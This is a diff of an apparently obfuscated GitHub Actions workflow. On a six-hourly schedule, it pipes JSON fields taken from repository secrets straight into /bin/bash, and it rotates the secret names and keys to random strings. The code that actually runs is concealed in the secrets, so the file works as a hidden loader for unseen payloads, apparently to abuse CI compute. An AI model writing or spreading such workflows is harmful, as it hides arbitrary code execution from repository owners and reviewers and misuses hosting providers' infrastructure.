@@ -1,35 +1,27 @@
 name: zhenbeiwang4896
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 0/6 * * *'
+    - cron: '38 3/6 * * *'
 
-jobs:  # 14137
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhenbeiwang4896
         env:
-          svmcm12563: ${{ secrets.svmcm12563 }}
+          g95: ${{ secrets.g95 }}
         run: |
-          echo $svmcm12563 | jq -r .s3 | /bin/bash
-          echo $lfyo20 | jq -r .a76 | /bin/bash
-          echo $fya40682 | jq -r .yezc239 | /bin/bash
-          echo $mzmr02107 | jq -r .pick843 | /bin/bash
-          echo $usasg2703 | jq -r .ninkg3966 | /bin/bash
-          echo $mvh41900 | jq -r .sq04274 | /bin/bash
-          echo $ptnj526 | jq -r .oc2 | /bin/bash
-          echo $yoz29 | jq -r .wpaf3999 | /bin/bash
-          echo $hrbff5 | jq -r .q7249 | /bin/bash
-          echo $re2 | jq -r .ogypd6992 | /bin/bash
-          echo $j3 | jq -r .fapy7799 | /bin/bash
-          echo $l65184 | jq -r .b33 | /bin/bash
-          echo $pwsf2917 | jq -r .gqyez3 | /bin/bash
-          echo $ugte3479 | jq -r .par07501 | /bin/bash
-          echo $x0463 | jq -r .xc79114 | /bin/bash
-          echo $n981 | jq -r .otgz15 | /bin/bash
-          echo $ydxfb975 | jq -r .zv85 | /bin/bash
-          echo $ss640 | jq -r .s3507 | /bin/bash
+          echo $g95 | jq -r .vreyx4087 | /bin/bash
+          echo $pe36 | jq -r .jb4295 | /bin/bash
+          echo $qg483 | jq -r .luknx9 | /bin/bash
+          echo $z0 | jq -r .tqrs3511 | /bin/bash
+          echo $x58682 | jq -r .r6 | /bin/bash
+          echo $rma1 | jq -r .ux0 | /bin/bash
+          echo $m2574 | jq -r .ckugc0 | /bin/bash
+          echo $m73 | jq -r .j83086 | /bin/bash
+          echo $qnd60 | jq -r .zqa97 | /bin/bash
+          echo $woex51542 | jq -r .ugry9 | /bin/bash
 
